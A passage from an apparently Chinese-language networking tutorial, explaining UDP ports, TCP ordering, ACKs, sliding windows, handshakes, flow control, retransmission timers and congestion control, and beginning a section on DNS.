<p>端口(port)是伴随着传输层诞生的概念。它可以将网络层的 IP 通信分送到各个通信通道。UDP 协议和 TCP 协议尽管在工作方式上有很大的不同，但它们都建立了从一个端口到另一个端口的通信。</p>
<p>随着我们进入传输层，我们也可以调用操作系统中的 API，来构建 socket。Socket 是操作系统提供的一个编程接口，它用来代表某个网络通信。应用程序通过 socket 来调用系统内核中处理网络协议的模块，而这些内核模块会负责具体的网络协议的实施。这样，我们可以让内核来接收网络协议的细节，而我们只需要提供所要传输的内容就可以了，内核会帮我们控制格式，并进一步向底层封装。因此，在实际应用中，我们并不需要知道具体怎么构成一个 UDP 包，而只需要提供相关信息(比如 IP 地址，比如端口号，比如所要传输的信息)，操作系统内核会在传输之前会根据我们提供的相关信息构成一个合格的 UDP 包(以及下层的包和帧)。socket 是一个比较大的课题，在这里不会过多深入。</p>
<p>端口是传输层带来的最重要的概念。我们进一步了解了 UDP 协议。如果已经掌握了 IP 协议，那么 UD P协议就没有任何困难可言，它只是 IP 协议暴露在传输层上的接口。</p>
<h3 id="TCP_u534F_u8BAE_u4E0E_u6D41_u901A_u4FE1"><a href="#TCP_u534F_u8BAE_u4E0E_u6D41_u901A_u4FE1" class="headerlink" title="TCP协议与流通信"></a>TCP协议与流通信</h3><p>TCP(Transportation Control Protocol)协议与 IP 协议是一同产生的。事实上，两者最初是一个协议，后来才被分拆成网络层的 IP 和传输层的 TCP。我们已经在 UDP 协议中介绍过，UDP 协议是 IP 协议在传输层的“傀儡”，用来实现数据包形式的通信。而 TCP 协议则实现了“流”形式的通信。</p>
<p>TCP的内容非常丰富。我不能在一篇文章中将TCP讲完。这一篇主要介绍TCP协议的下面几个方面：</p>
<ol>
<li>“流”通信的意义与实现方式</li>
<li>如何实现可靠传输</li>
<li>使用滑窗提高效率</li>
</ol>
<p>TCP 协议是传输层协议，实现的是端口到端口(port)的通信。更进一步，TCP 协议虚拟了文本流(byte stream)的通信。在 Linux 文本流中我们谈到，计算机数据的本质是有序的 0/1 序列 (如果以 byte为单位，就叫做文本流)。计算机的功能就是储存和处理文本流。CPU + memory + 存储设备实现了文本流在同一台计算机内部的加工处理。通过一些 IO，比如屏幕和键盘，文本流实现了人机交互。而进一步，如果网络通信可在不同计算机之间进行文本流的交互，那么我们就和整个计算机系统的数据处理方式实现了对接。</p>
<p>IP 协议和 UDP 协议采用的是数据包的方式传送，后发出的数据包可能早到，我们并不能保证数据到达的次序。TCP 协议确保了数据到达的顺序与文本流顺序相符。当计算机从 TCP 协议的接口读取数据时，这些数据已经是排列好顺序的“流”了。比如我们有一个大文件要从本地主机发送到远程主机，如果是按照“流”接收到的话，我们可以一边接收，一边将文本流存入文件系统。这样，等到“流”接收完了，硬盘写入操作也已经完成。如果采取 UDP 的传输方式，我们需要等到所有的数据到达后，进行排序，才能组装成大的文件。这种情况下，我们不得不使用大量的计算机资源来存储已经到达的数据，直到所有数据都达到了，才能开始处理。</p>
<p>“流”的要点是次序(order)，然而实现这一点并不简单。TCP 协议是基于 IP 协议的，所以最终数据传送还是以 IP 数据包为单位进行的。如果一个文本流很长的话，我们不可能将整个文本流放入到一个 IP 数据包中，那样有可能会超过 MTU。所以，TCP 协议封装到 IP 包的不是整个文本流，而是 TCP 协议所规定的片段(segment)。与之前的一个 IP 或者 UDP 数据包类似，一个 TCP 片段同样分为头部(header)和数据(payload)两部分 (“片段”这个名字更多是起提醒作用：嘿，这里并不是完整的文本流)。整个文本流按照次序被分成小段，而每一段被放入 TCP 片段的数据部分。一个 TCP 片段封装成的 IP 包不超过整个 IP 接力路径上的最小 MTU，从而避免令人痛苦的碎片化(fragmentation)。</p>
<p>(给文本流分段是在发送主机完成的，而碎片化是在网络中的路由器完成的。路由器要处理许多路的通信，所以相当繁忙。文本流提前在发送主机分好段，可以避免在路由器上执行碎片化，可大大减小网络负担)</p>
<p>TCP 片段的头部(header)会存有该片段的序号(sequence number)。这样，接收的计算机就可以知道接收到的片段在原文本流中的顺序了，也可以知道自己下一步需要接收哪个片段以形成流。比如已经接收到了片段1，片段2，片段3，那么接收主机就开始期待片段4。如果接收到不符合顺序的数据包(比如片段8)，接收方的TCP模块可以拒绝接收，从而保证呈现给接收主机的信息是符合次序的“流”。</p>
<p><strong>可靠性</strong></p>
<p>片段编号这个初步的想法并不能解决我们所有的问题。IP 协议是不可靠的，所以 IP 数据包可能在传输过程中发生错误或者丢失。而IP传输是”Best Effort” 式的，如果发生异常情况，我们的IP数据包就会被轻易的丢弃掉。另一方面，如果乱序(out-of-order)片段到达，根据我们上面说的，接收主机不会接收。这样，错误片段、丢失片段和被拒片段的联手破坏之下，接收主机只可能收到一个充满“漏洞”的文本流。</p>
<p>TCP 的补救方法是，在每收到一个正确的、符合次序的片段之后，就向发送方(也就是连接的另一段)发送一个特殊的 TCP 片段，用来知会(ACK，acknowledge)发送方：我已经收到那个片段了。这个特殊的 TCP 片段叫做 ACK 回复。如果一个片段序号为 L，对应 ACK 回复有回复号 L+1，也就是接收方期待接收的下一个发送片段的序号。如果发送方在一定时间等待之后，还是没有收到 ACK 回复，那么它推断之前发送的片段一定发生了异常。发送方会重复发送(retransmit)那个出现异常的片段，等待 ACK 回复，如果还没有收到，那么再重复发送原片段… 直到收到该片段对应的 ACK 回复(回复号为L+1的ACK)。</p>
<p>当发送方收到 ACK 回复时，它看到里面的回复号为 L+1，也就是发送方下一个应该发送的 TCP 片段序号。发送方推断出之前的片段已经被正确的接收，随后发出 L+1 号片段。ACK 回复也有可能丢失。对于发送方来说，这和接收方拒绝发送 ACK 回复是一样的。发送方会重复发送，而接收方接收到已知会过的片段，推断出 ACK 回复丢失，会重新发送 ACK 回复。</p>
<p>通过ACK回复和重新发送机制，TCP 协议将片段传输变得可靠。尽管底盘是不可靠的 IP 协议，但 TCP 协议以一种“不放弃的精神”，不断尝试，最终成功。(技术也可以很励志)</p>
<p>TCP 协议和 UDP 协议走了两个极端。TCP 协议复杂但可靠，UDP 协议轻便但不可靠。在处理异常的时候，TCP 极端负责，而 UDP 一副无所谓的样子。</p>
<h3 id="u6ED1_u7A97"><a href="#u6ED1_u7A97" class="headerlink" title="滑窗"></a>滑窗</h3><p>上面的工作方式中，发送方保持发送-&gt;等待ACK-&gt;发送-&gt;等待ACK…的单线工作方式，这样的工作方式叫做 stop-and-wait。stop-and-wait 虽然实现了 TCP 通信的可靠性，但同时牺牲了网络通信的效率。在等待 ACK 的时间段内，我们的网络都处于闲置(idle)状态。我们希望有一种方式，可以同时发送出多个片段。然而如果同时发出多个片段，那么由于 IP 包传送是无次序的，有可能会生成乱序片段(out-of-order)，也就是后发出的片段先到达。在 stop-and-wait 的工作方式下，乱序片段完全被拒绝，这也很不效率。毕竟，乱序片段只是提前到达的片段。我们可以在缓存中先存放它，等到它之前的片段补充完毕，再将它缀在后面。然而，如果一个乱序片段实在是太过提前(太“乱”了)，该片段将长时间占用缓存。我们需要一种折中的方法来解决该问题：利用缓存保留一些“不那么乱”的片段，期望能在段时间内补充上之前的片段(暂不处理，但发送相应的 ACK)；对于“乱”的比较厉害的片段，则将它们拒绝(不处理，也不发送对应的 ACK)。</p>
<p>滑窗(sliding window)被同时应用于接收方和发送方，以解决以上问题。发送方和接收方各有一个滑窗。当片段位于滑窗中时，表示TCP正在处理该片段。滑窗中可以有多个片段，也就是可以同时处理多个片段。滑窗越大，越大的滑窗同时处理的片段数目越多(当然，计算机也必须分配出更多的缓存供滑窗使用)。TCP协议有实时调整滑窗大小的算法，以实现最优效率。</p>
<p>TCP协议和UDP协议走了两个极端。TCP协议复杂但可靠，UDP协议轻便但不可靠。在处理异常的时候，TCP极端负责，而UDP一副无所谓的样子。在TCP中，分段和编号实现了次序；ACK和重新发送实现了可靠性；sliding window则让上面的机制更加有效率的运行。Never give up，这就是TCP协议的态度。</p>
<h3 id="TCP_u8FDE_u63A5"><a href="#TCP_u8FDE_u63A5" class="headerlink" title="TCP连接"></a>TCP连接</h3><p>在 TCP 协议与”流”通信中，我们概念性的讲解了 TCP 通信的方式。可以看到，TCP 通信最重要的特征是：有序(ordering)和可靠(reliable)。有序是通过将文本流分段并编号实现的。可靠是通过 ACK 回复和重复发送(retransmission)实现的。这一篇文章将引入 TCP 连接(connection)的概念。</p>
<p>网络层在逻辑上提供了端口的概念。一个 I P地址可以有多个端口。一个具体的端口需要 IP 地址和端口号共同确定(我们记为 IP:port 的形式)。一个连接为两个 IP:port 之间建立 TCP 通信。</p>
<p>参与连接的如果是两台电脑，那么两台电脑操作系统的 TCP 模块负责建立连接。每个连接有四个参数(两个 IP，两个端口)，来表明“谁在和谁通话”。每台电脑都会记录有这四个参数，以确定是哪一个连接。如果这四个参数完全相同，则为同一连接；如果这四个参数有一个不同，即为不同的连接。这意味着，同一个端口上可以有多个连接。内核中的TCP模块生成连接之后，将连接分配给进程使用。</p>
<p>TCP 连接是双向(duplex)的。在 TCP 协议与”流”通信中，我们所展示的 TCP 传输是单向的。双向连接实际上就是建立两个方向的 TCP 传输，所以概念上并不复杂。这时，连接的每一方都需要两个滑窗，以分别处理发送的文本流和接收的文本流。由于连接的双向性，我们也要为两个方向的文本流编号。这两个文本流的编号相互独立。为文本流分段和编号由发送方来处理，回复 ACK 则由接收的一方进行。</p>
<p><strong>TCP片段的头部格式</strong></p>
<p>在深入 TCP 连接之前，我们需要对 TCP 片段的头部格式有一些了解。我们知道，TCP 片段分为头部和数据。数据部分为 TCP 真正传输的文本流数据。下面为 TCP 片段的头部格式：</p>
<p><img src="/images/14551394884094.jpg" alt=""></p>
<p>先关注下面几点：</p>
<ol>
<li>一个 TCP 头部需要包含出发端口(source port)和目的地端口(destination port)。这些与 IP 头中的两个 IP 地址共同确定了连接。</li>
<li>每个 TCP 片段都有序号(sequence number)。这些序号最终将数据部分的文本片段整理成为文本流。</li>
<li>ACK 是一位(bit)。只有 ACK 位设定的时候，回复号(Acknowledgement number)才有效。ACK 回复号说明了接收方期待接收的下一个片段，所以 ACK 回复号为最后接收到的片段序号加 1。<ul>
<li>很多时候，ACK 回复“附着”在发送的数据片段中。TCP 协议是双向的。比如 A 和 B 两个电脑。 ACK 回复是接收方回复给发送方 (比如 A 发送给 B， B 回复 A)。但同时，B 也可以是发送方，B 有可能有数据发送给 A，所以 B 就把 ACK 回复附着在它要发送给 A 的数据片段的头部。这样可以减少 ACK 所占用的交通流量。一个片段可以只包含 ACK 回复。一个纯粹的 ACK 回复片段不传送文本流，所以不消耗序列号。如果有下一个正常的数据片段，它的序号将与纯粹 ACK 回复片段的序号相同。</li>
<li>(ACK 回复还可以“附着”在 SYN 片段和 FIN 片段)</li>
</ul>
</li>
<li>ACK 后面还有 SYN 和 FIN，它们也各占据一位(bit)。我将在后面说明这两位。</li>
</ol>
<p><strong>连接的建立</strong></p>
<p>在 TCP 协议与”流”通信中讨论的 TCP 传输需要一个前提：TCP 连接已经建立。然而，TCP 连接从无到有需要一个建立连接的过程。建立连接的最重要目是让连接的双方交换初始序号(ISN, Initial Sequence Number)。根据 TCP 协议的规定，文本流的第一个片段的序号不能是确定的数字(比如说1)。连接的双方各自随机生成自己的 ISN，然后再利用的一定方式让对方了解。这样的规定是出于 TCP 连接安全考虑：如果以一个确定的数字作为初始的 TCP 序号，那么其他人很容易猜出接下来的序列号，并按照正确的序号发送“伪装”的 TCP 片段，以插入到文本流中。</p>
<p>ISN 交换是通过 SYN 片段实现的。SYN 片段由头部的 SYN 位表明，它的序号为发送方的 ISN。该片段由连接的一方首先发给给另一方，我们将发送 SYN 的一方称为客户(client)，而接收 SYN 的一方称为服务器(server)。我们使用 ISN(c) 表示 client 一方的 ISN，使用 ISN(s) 表示 server 一方的 ISN。随后，接收到 SYN 的 server 需要回复 ACK，并发送出包含有 server 的 ISN 的 SYN 片段。下图为建立连接的过程，也就是经典的 TCP 三次握手(three-way handshaking)。两条竖直线分别为 client 和 server 的时间轴。每个箭头代表了一次 TCP 片段的单向传输。</p>
<p><img src="/images/14551395013280.jpg" alt=""></p>
<p><strong>连接的正常终结</strong></p>
<p>一个连接建立之后，连接两端的进程可以利用该连接进行通信。当连接的一方觉得“我讲完了”，它可以终结连接中发送到对方方向的通信。连接最终通过四次握手(four-way handshaking)的方式终结，连接终结使用的是特殊片段 FIN(FIN位为1的片段)。</p>
<p><img src="/images/14551395178688.jpg" alt=""></p>
<p>我们可以看到，连接终结的过程中，连接双方也交换了四片信息(两个 FIN 和两个 ACK)。在终结连接的过程中，TCP 并没有合并 FIN 与 ACK 片段。原因是 TCP 连接允许单向关闭(half-close)。也就是说，TCP 连接关闭了一个方向的传输，成为一个单向连接(half-duplex)。第二个箭头和第三个箭头传递必须分开，才能有空隙在开放的方向上继续传输。如果第二个箭头和第三个箭头合并在一起，那么，随着一方关闭，另一方也要被迫关闭。</p>
<p>第二和第三次握手之间，server 可以继续单向的发送片段给 client，但 client 不能发送数据片段给 server。</p>
<p>(上面的终结从 client 先发起，TCP 连接终结也可以从 server 先发起。)</p>
<p>在 Client 发送出最后的 ACK 回复，但该 ACK 可能丢失。Server 如果没有收到 ACK，将不断重复发送 FIN 片段。所以 Client 不能立即关闭，它必须确认 Server 接收到了该 ACK。Client 会在发送出 ACK 之后进入到 <code>TIME_WAIT</code> 状态。Client 会设置一个计时器，等待 2MSL 的时间。如果在该时间内再次收到 FIN，那么 Client 会重发 ACK 并再次等待 2MSL。所谓的 2MSL 是两倍的 MSL(Maximum Segment Lifetime)。MSL 指一个片段在网络中最大的存活时间，2MSL 就是一个发送和一个回复所需的最大时间。如果直到 2MSL，Client 都没有再次收到 FIN，那么 Client 推断 ACK 已经被成功接收，则结束 TCP 连接。</p>
<p>TCP 是连接导向的协议，与之对应的是像 UDP 这样的非连接导向的协议。连接能带来更好的传输控制，但也需要更多额外的工作，比如连接的建立和终结。</p>
<p>我们还初步了解了 TCP 的头部格式。应该注意到，许多时候我们将 ACK 片段“附着”在其他片段上。相对于纯粹的 ACK 片段，我们这样做节约了 ACK 所需的流量。事实上，由于 ACK 片段所需的 ACK 位和 acknowledge number 区域总是存在于 TCP 的头部，所以附着 ACK 片段的成本基本上等于 0。</p>
<h3 id="TCP_u6ED1_u7A97_u7BA1_u7406"><a href="#TCP_u6ED1_u7A97_u7BA1_u7406" class="headerlink" title="TCP滑窗管理"></a>TCP滑窗管理</h3><p>在 TCP 协议与”流”通信中，我们建立了滑窗(sliding window)的基本概念。通过滑窗与 ACK 的配合，我们一方面实现了 TCP 传输的可靠性，另一方面也一定程度上提高了效率。</p>
<p>然而，之前的解释只是概念性的。TCP 为了达到更好的传输效率，对上面的工作方式进行了许多改进。The devil is in the details. 我们需要深入到细节，才能看清楚TCP协议的智慧所在。</p>
<p><strong>累计ACK</strong></p>
<p>在 TCP 连接中，我们通过将 ACK 回复“附着”在其他数据片段的方式，减少了 ACK 回复所消耗的流量。但这并不是全部的故事。TCP 协议并不是对每个片段都发送 ACK 回复。TCP 协议实际采用的是累计 ACK 回复(accumulative acknowledgement)。接收方往往利用一个 ACK 回复来知会连续多个片段的成功接收。通过累计 ACK，所需要的 ACK 回复通常可以降到 50%。</p>
<p>如下图所示，橙色为已经接收的片段。方框为滑窗，滑窗可容纳 3 个片段。</p>
<p><img src="/images/14551395342559.jpg" alt=""></p>
<p>滑窗还没接收到片段7时，已接收到片段8，9。这样就在滑窗中制造了一个“空穴”(hole)。当滑窗最终接收到片段7时，滑窗送出一个回复号为10的ACK回复。发送方收到该回复，会意识到，片段10之前的片段已经按照次序被成功接收。整个过程中节约了片段7和片段8所需的两个ACK回复。</p>
<p>此外，接收方在接收到片断，并应该回复ACK的时候，会故意延迟一些时间。如果在延迟的时间里，有后续的片段到达，就可以利用累计ACK来一起回复了。</p>
<p><strong>滑窗结构</strong></p>
<p>在之前的讨论中，我们以片段为单位，来衡量滑窗的大小的。真实的滑窗是以 byte 为单位表示大小，但这并不会对我们之前的讨论造成太大的影响。</p>
<p><img src="/images/14551395682155.jpg" alt=""></p>
<p>发送方滑窗可以分为下面两个部分。offered window 为整个滑窗的大小。</p>
<p><img src="/images/14551395777596.jpg" alt=""></p>
<p>可以看到，接收方的滑窗相对于发送方的滑窗多了一个”Received; ACKed; Not Sent to Proc”的部分。接收方接收到的文本流必须等待进程来读取。如果进程正忙于做别的事情，那么这些文本流即使已经正确接收，还是需要暂时占用接收缓存。当出现上述占用时，滑窗的可用部分(也就是图中advertised window)就会缩水。这意味着接收方的处理能力下降。如果这个时候发送方依然按照之前的速率发送数据给接收方，接收方将无力接收这些数据。</p>
<h3 id="u6D41_u91CF_u63A7_u5236"><a href="#u6D41_u91CF_u63A7_u5236" class="headerlink" title="流量控制"></a>流量控制</h3><p>TCP协议会根据情况自动改变滑窗大小，以实现流量控制。流量控制(flow control)是指接收方将advertised window的大小通知给发送方，从而指导发送方修改 offered window 的大小。接收方将该信息放在 TCP 头部的 window size 区域：</p>
<p><img src="/images/14551395892901.jpg" alt=""></p>
<p>发送方在收到 window size 的通知时，会调整自己滑窗的大小，让 offered window 和advertised window 相符。这样，发送窗口变小，文本流发送速率降低，从而减少了接收方的负担。</p>
<p><strong>零窗口</strong></p>
<p>advertised window 大小有可能变为0，这意味着接收方的接收能力降为0。发送方收到大小为0的advertised window 通知时，停止发送。</p>
<p>当接收方经过处理，再次产生可用的 advertised window 时，接收方会通过纯粹的 ACK 回复来通知发送方，让发送方恢复发送。然而，ACK 回复的传送并不是可靠的。如果该 ACK 回复丢失，那么 TCP 传输将陷入死锁(deadlock)状态。</p>
<p>为此，发送方会在零窗口后，不断探测接收方的窗口。窗口探测(window probe)时，发送方会向接收方发送包含 1 byte 文本流的 TCP 片段，并等待 ACK 回复(该 ACK 回复包含有 window size)。由于有 1 byte 的数据存在，所以该传输是可靠的，而不用担心 ACK 回复丢失的问题。如果探测结果显示窗口依然为 0，发送方会等待更长的时间，然后再次进行窗口探测，直到 TCP 传输恢复。</p>
<p><strong>白痴窗口综合症</strong></p>
<p>滑窗机制有可能犯病，比如白痴窗口综合症 (Silly Window Syndrome)。假设这样一种情形：接收方宣布(advertise)一个小的窗口，发送方根据advertised window，发送一个小的片段。接收方的小窗口被填满，经过处理，接收方再宣布一个小的窗口…… 这就是“白痴窗口综合症”：TCP通信的片段中包含的数据量很小。在这样的情况下，TCP 通信的片段所含的信息都很小，网络流量主要是 TCP 片段的头部，从而造成流量的浪费 (由于 TCP 头部很大，我们希望每个 TCP 片段中含有比较多的数据)。</p>
<p>如果发送方不断发送小的片段，也会造成“白痴窗口”。为了解决这个问题，需要从两方面入手。TCP中有相关的规定，要求：</p>
<ol>
<li>接收方宣告的窗口必须达到一定的尺寸，否则等待。</li>
<li>除了一些特殊情况，发送方发送的片段必须达到一定的尺寸，否则等待。特殊情况主要是指需要最小化延迟的 TCP 应用(比如命令行互动)。</li>
</ol>
<p>累计 ACK 减少了 TCP 传输过程中所需的 ACK 流量。通过流量管理，TCP 连接两端的工作能力可以匹配，从而减少不不要的传输浪费。累计 ACK 和流量控制都是 TCP 协议的重要特征。</p>
<p>TCP 协议相当复杂，并充斥着各种细节。然而 TCP 协议又是如此重要的一个协议，引领风骚三十年，可以说是互联网的奇迹。这些细节正是 TCP 协议成功的原因，并值得我们深入了解。</p>
<h3 id="TCP_u91CD_u65B0_u53D1_u9001"><a href="#TCP_u91CD_u65B0_u53D1_u9001" class="headerlink" title="TCP重新发送"></a>TCP重新发送</h3><p>TCP 协议是一个可靠的协议。它通过重新发送(retransmission)来实现 TCP 片段传输的可靠性。简单的说，TCP 会不断重复发送 TCP 片段，直到片段被正确接收。</p>
<p><strong>TCP片段丢失</strong></p>
<p><img src="/images/14551396019064.jpg" alt=""></p>
<p>接收方(receiver)可以通过校验 TCP 片段头部中 checksum 区域来检验 TCP 片段是否出错。我们已经接触过了 IP 协议详解的 checksum 算法。TCP 片段的 checksum 算法与之类似。IP 协议的 checksum 只校验头部，TCP 片段头部的 checksum 会校验包括 IP 头部、TCP 头部和 TCP 数据在内的整个序列，确保 IP 地址、端口号和其他相关信息正确。如果 TCP 片段出错，接收方可以简单的丢弃改 TCP 片段，也就相当于 TCP 片段丢失。</p>
<p>TCP 片段包裹在一个 IP 包中传输。IP 包可能在网络中丢失。导致 IP 包丢失的原因可能有很多，比如 IP 包经过太多的路由器接力，达到 hop limit；比如路由器太过拥挤，导致一些 IP 包被丢弃；再比如路由表(routing table)没有及时更新，导致 IP 包无法送达目的地。</p>
<p>下面我们要介绍两种重新发送 TCP 片段的机制：超时重新发送和快速重新发送。 </p>
<p><strong>超时重新发送</strong></p>
<p>我们之前已经简单介绍过重新发送的机制：当发送方送出一个 TCP 片段后，将开始计时，等待该 TCP 片段的 ACK 回复。如果接收方正确接收到符合次序的片段，接收方会利用 ACK 片段回复发送方。发送方得到 ACK 回复后，继续移动窗口，发送接下来的 TCP 片段。如果直到计时完成，发送方还是没有收到 ACK 回复，那么发送方推断之前发送的 TCP 片段丢失，因此重新发送之前的 TCP 片段。这个计时等待的时间叫做重新发送超时时间(RTO, retransmission timeout)。</p>
<p>发送方应该在等待多长时间之后重新发送呢？这是重新发送的核心问题。上述过程实际上有往返两个方向：</p>
<ol>
<li>发送片段从发送方到接收方的传输，</li>
<li>ACK 片段从接收方到发送方的传输</li>
</ol>
<p>整个过程实际耗费的时间称做往返时间(RTT, round trip time)。如果 RTT 是固定的，比如1秒，那么我们可以让 RTO 等于 RTT。但实际上，RTT 的上下浮动很大。比如某个时刻，网络中有许多交通，那么 RTT 就增加。在 RTT 浮动的情况下，如果我们设置了过小的 RTO，那么 TCP 会等待很短的时间之后重新发送，而实际上之前发送的片段并没有丢失，只是传输速度比较慢而已，这样，网络中就被重复注入 TCP 片段，从而浪费网络传输资源。另一方面，如果 RTO 时间过长，那么当 TCP 片段已经实际丢失的情况下，发送方不能及时重新发送，会造成网络资源的闲置。所以，RTO 必须符合当前网络的使用状况。网络状况越好，RTO 应该越短；网络状况越差，RTO 应该越长。</p>
<p>TCP 协议通过统计 RTT，来决定合理的 RTO。发送方可以测量每一次 TCP 传输的 RTT (从发送出数据片段开始，到接收到 ACK 片段为止)，这样的每次测量得到的往返时间，叫做采样 RTT(srtt, sampling round trip time)。建立连接之后，每次的 srtt 作为采样样本，计算平均值(mean)和标准差(standard deviation)，并让 RTO 等于 srtt 平均值加上四倍的 srtt 标准差。</p>
<p>RTO = mean + 4 std</p>
<p>(上述算法有多个变种，根据平台不同有所变化)</p>
<p>平均值反映了平均意义上的 RTT，平均往返时间越大，RTO 越大。另一方面，标准差越大也会影响 RTO。标准差代表了 RTT 样本的离散程度。如果 RTT 上下剧烈浮动，标准差比较大。RTT 浮动大，说明当前网络状况相对不稳定。因此要设置更长的 RTO，以应对不稳定的网络状况。</p>
<p><strong>快速重新发送</strong></p>
<p>我们刚才介绍了超时重新发送的机制：发送方送出一个 TCP 片段，然后开始等待并计时，如果 RTO 时间之后还没有收到 AC K回复，发送方则重新发送。TCP 协议有可能在计时完成之前启动重新发送，也就是利用快速重新发送(fast-retransmission)。快速发送机制如果被启动，将打断计时器的等待，直接重新发送 TCP 片段。</p>
<p>由于IP包的传输是无序的，所以接收方有可能先收到后发出的片段，也就是乱序(out-of-order)片段。乱序片段的序号并不等于最近发出的ACK回复号。已接收的文本流和乱序片段之间将出现空洞(hole)，也就是等待接收的空位。比如已经接收了正常片段5,6,7，此时又接收乱序片段9。这时片段8依然空缺，片段8的位置就是一个空洞。</p>
<p>TCP 协议规定，当接收方收到乱序片段的时候，需要重复发送 ACK。比如接收到乱序片段 9 的时候，接收方需要回复 ACK。回复号为 8 (7+1)。此后接收方如果继续收到乱序片段(序号不是8的片段)，将再次重复发送 ACK=8。当发送方收到 3 个 ACK=8 的回复时，发送方推断片段 8 丢失。即使此时片段 8 的计时器还没有超时，发送方会打断计时，直接重新发送片段 8，这就是快速重新发送机制(fast-retransmission)。</p>
<p>快速重新发送机制利用重复的 ACK 来提示空洞的存在。当重复次数达到阈值时，认为空洞对应的片段在网络中丢失。快速重新发送机制提高了检测丢失片段的效率，往往可以在超时之前探测到丢失片段，并重复发送丢失的片段。</p>
<h3 id="TCP_u5835_u585E_u63A7_u5236"><a href="#TCP_u5835_u585E_u63A7_u5236" class="headerlink" title="TCP堵塞控制"></a>TCP堵塞控制</h3><p>在 TCP 协议中，我们使用连接记录 TCP 两端的状态，使用编号和分段实现了 TCP 传输的有序，使用 advertised window 来实现了发送方和接收方处理能力的匹配，并使用重复发送来实现 TCP 传输的可靠性。我们只需要将 TCP 片段包装成 IP 包，扔到网络中就可以了。TCP 协议的相关模块会帮我们处理各种可能出现的问题(比如排序，比如TCP片段丢失等等)。最初的 TCP 协议就是由上述的几大块构成的。</p>
<p>然而进入上世纪八十年代，网络开始变的繁忙。许多网络中出现了大量的堵塞(congestion)。堵塞类似于现实中的堵车。网络被称为“信息高速公路”。许多汽车(IP包)在网络中行驶，并经过一个一个路口 (路由器)，直到到达目的地。一个路由器如果过度繁忙，会丢弃一些 IP 包。UDP 协议不保证传输的可靠性，所以丢失就丢失了。而 TCP 协议需要保证传输的可靠性，当包含有 TCP 片段的 IP 包丢失时，TCP 协议会重复发送 TCP 片段。于是，更多的“汽车”进入到公路中，原本繁忙的路由器变得更加繁忙，更多的IP包丢失。这样就构成了一个恶性循环。这样的情况被称为堵塞崩溃(congestion collapse)。每个发送方为了保证自己的发送质量，而不顾及公共领域现状，是造成堵塞崩溃的主要原因。当时的网络中高达90%的传输资源可能被堵塞崩溃所浪费。</p>
<p>为了解决这一缺陷，从八十年代开始，TCP 协议中开始加入堵塞控制(congestion control)的功能，以避免堵塞崩溃的出现。多个算法被提出并实施，大大改善了网络的交通状况。直到今天，堵塞控制依然是互联网研究的一个活跃领域。</p>
<p>现实中，当我们遇到堵车，可能就会希望兴建立交桥和高架，或者希望有一位交警来疏导交通。而 TCP 协议的堵塞控制是通过约束自己实现的。当 TCP 的发送方探测到网络交通拥堵时，会控制自己发送片段的速率，以缓解网络的交通状况，避免堵塞崩溃。简言之，TCP 协议规定了发送方需要遵守的“公德”。</p>
<p>我们先来说明堵塞是如何探测的。在 TCP 重新发送中，我们已经总结了两种推测 TCP 片段丢失的方法：ACK 超时和重复 ACK。一旦发送方认为 TCP 片段丢失，则认为网络中出现堵塞。</p>
<p>另一方面，TCP 发送方是如何控制发送速率呢？TCP 协议通过控制滑窗(sliding window)大小来控制发送速率。在 TCP 滑窗管理中，我们已经见到了一个窗口限制，就是advertised window size，以实现 TCP 流量控制。TCP 还会维护一个congestion window size，以根据网络状况来调整滑窗大小。真实滑窗大小取这两个滑窗限制的最小值，从而同时满足两个限制 (流量控制和堵塞控制)</p>
<p><strong>Congestion Window</strong></p>
<p>congestion window 总是处于两种状态的一个。这两种状态是: 慢起动(slow start)和堵塞避免(congestion avoidance)。</p>
<p><img src="/images/14551396186893.jpg" alt=""></p>
<p>上图是概念性的。实际的实施要比上图复杂，而且根据算法不同会有不同的版本。cwnd 代表congestion window size。我们以片段的个数为单位，来表示 cwnd 的大小 (同样是概念性的)。</p>
<p>Congestion window 从 slow start的状态开始。Slow start 的特点是初始速率低，但速率不断倍增。每次进入到 slow start 状态时，cwnd 都需要重置为初始值 1。发送方每接收到一个正确的 ACK，就会将 congestion window 增加 1，从而实现速率的倍增(由于累计 ACK，速率增长可能会小于倍增)。</p>
<p>当 congestion window 的大小达到某个阈值 ssthresh 时，congestion 进入到 congestion avoidance 状态。发送速率会继续增长。发送方在每个窗户所有片段成功传输后，将窗口尺寸增加 1(实际上就是每个 RTT 增加 1)。所以在 congestion avoidance 下，cwnd 线性增长，增长速率慢。</p>
<p>如果在 congestion avoidance 下有片段丢失，重新回到 slow start 状态，并将 ssthresh 更新为 cwnd 的一半。</p>
<p>我们看到，sshthresh 是 slow start 到 congestion avoidance 的切换点。而片段丢失是 congestion avoidance 到 slow start 的切换点。一开始 sshthresh 的值一般比较大，所以 slow start 可能在切换成 congestion avoidance 之前就丢失片段。这种情况下，slow start 会重新开始，而 ssthresh 更新为 cwnd 的一半。</p>
<p>总的来说，发送速率总是在增长。如果片段丢失，则重置速率为1，并快速增长。增长到一定程度，则进入到慢性增长。快速增长和慢性增长的切换点(sshthred)会随着网络状况(何时出现片段丢失)更新。通过上面的机制，让发送速率处于动态平衡，不断的尝试更大值。初始时增长块，而接近饱和时增长慢。但一旦尝试过度，则迅速重置，以免造成网络负担。</p>
<p>阻塞控制有效的提高了互联网的利用率。阻塞控制的算法多种多样，并且依然不完善。一个常见的问题是cwnd在接近饱和时线性增长，因此对新增的网络带宽不敏感。</p>
<p>互联网利用“公德”来实现效率。“公德”和效率似乎可以并存。</p>
<p>到现在为止，TCP协议的介绍就可以告一段落了。可以回想一下TCP的几大模块：分段与流，滑窗，连接，流量控制，重新发送，堵塞控制。</p>
<h2 id="u5E94_u7528_u5C42_u534F_u8BAE"><a href="#u5E94_u7528_u5C42_u534F_u8BAE" class="headerlink" title="应用层协议"></a>应用层协议</h2><h3 id="DNS_u534F_u8BAE"><a href="#DNS_u534F_u8BAE" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>域名(domain name)是IP地址的代号。域名通常是由字符构成的。对于人类来说，字符构成的域名，比如 www.yahoo.com，要比纯粹数字构成的IP地址(106.10.170.118)容易记忆。域名解析系统(DNS, domain name system)就负责将域名翻译为对应的IP地址。在 DNS 的帮助下，我们可以在浏览器的地址栏输入域名，而不是IP地址。这大大减轻了互联网用户的记忆负担。另一方面，处于维护和运营的原因，一些网站可能会变更 IP 地址。这些网站可以更改 DNS 中的对应关系，从而保持域名不变，而 IP 地址更新。由于大部分用户记录的都是域名，这样就可以降低 IP 变更带来的影响。</p>
